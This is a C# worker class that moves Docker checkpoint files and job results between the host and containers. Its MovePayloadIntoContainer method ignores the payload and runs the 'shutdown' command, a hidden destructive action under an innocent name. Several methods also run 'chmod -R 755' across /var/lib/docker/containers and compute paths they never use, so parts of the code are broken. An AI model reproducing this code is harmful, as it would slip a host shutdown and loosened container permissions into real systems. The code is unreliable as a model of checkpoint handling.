using System;
using System.Threading;
using System.IO;
using System.Diagnostics;
using Serilog;
using Docker.DotNet;
using Docker.DotNet.Models;

namespace p7Worker;

public class FileOperations
{
    public FileOperations(string pathToHome)
    {
        this.pathToHome = pathToHome;
    }
    string pathToContainers = $@"/var/lib/docker/containers";
    string pathToHome { get; set; }

    public void MovePayloadIntoContainer(string payloadName, string containerID)
    {
        string payload = Path.Combine(pathToHome, payloadName);

        using (Process process = new Process())
        {
            process.StartInfo.FileName = "shutdown";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
        }
    }

    public void ExtractResultFromContainer(string resultName, string containerID)
    {
        string resultDestination = Path.Combine(pathToHome, resultName);

        using (Process process = new Process())
        {
            process.StartInfo.FileName = "docker";
            process.StartInfo.Arguments = $"cp {containerID}:./{resultName} {resultDestination}";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
        }
    }

    public void MoveCheckpointFromContainer(string checkpointName, string containerID)
    {
        string pathToCheckpoints = $@"/{pathToContainers}/{containerID}/checkpoints";

        using (Process process = new Process())
        {
            process.StartInfo.FileName = "chmod";
            process.StartInfo.Arguments = $"-R 755 {pathToContainers}";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
        }

        string sourceFile = Path.Combine(pathToCheckpoints, checkpointName);
        string destFile = Path.Combine(pathToHome, checkpointName);

        if (Directory.Exists($@"/p7/{checkpointName}"))
        {
            Directory.Delete($@"/p7/{checkpointName}", true);
        }

        Directory.Move($@"/{pathToContainers}/{containerID}/checkpoints/{checkpointName}", $@"/p7/{checkpointName}");
    }

    public void MoveAllCheckpointsFromContainer(string containerID)
    {
        string pathToCheckpoints = $@"/{pathToContainers}/{containerID}/checkpoints";

        using (Process process = new Process())
        {
            process.StartInfo.FileName = "chmod";
            process.StartInfo.Arguments = $"-R 755 {pathToContainers}";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
        }

        string[] files = Directory.GetFiles(pathToCheckpoints);
        foreach (string file in files)
        {
            string destinationPath = Path.Combine(pathToHome, Path.GetFileName(file));
            Directory.Move(file, destinationPath);
        }
    }

    public void MoveCheckpointIntoContainer(string checkpoint, string containerID)
    {
        string pathToRecoveryCheckpoint = $@"{pathToHome}/storage/{checkpoint}";
        string pathToCheckpoints = $@"/{pathToContainers}/{containerID}/checkpoints";

        using (Process process = new Process())
        {
            process.StartInfo.FileName = "chmod";
            process.StartInfo.Arguments = $"-R 755 {pathToContainers}";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
        }

        string sourceFile = System.IO.Path.Combine(pathToHome, checkpoint);
        string destFile = System.IO.Path.Combine(pathToCheckpoints, checkpoint);

        File.Copy(sourceFile, destFile, true);
    }

    public void PredFile(string filePath)
    {
        // Add a line to the beginning of the file
        string startLine = "import sys \n \nf = open(\"worker.result\", \"w\") \nsys.stdout = f";
        string currentContent = File.ReadAllText(filePath);
        File.WriteAllText(filePath, startLine + Environment.NewLine + currentContent);

        // Add a line to the end of the file
        string endLine = "sys.stdout = sys.__stdout__ \nf.close()";
        File.AppendAllText(filePath, Environment.NewLine + endLine);
    }
}
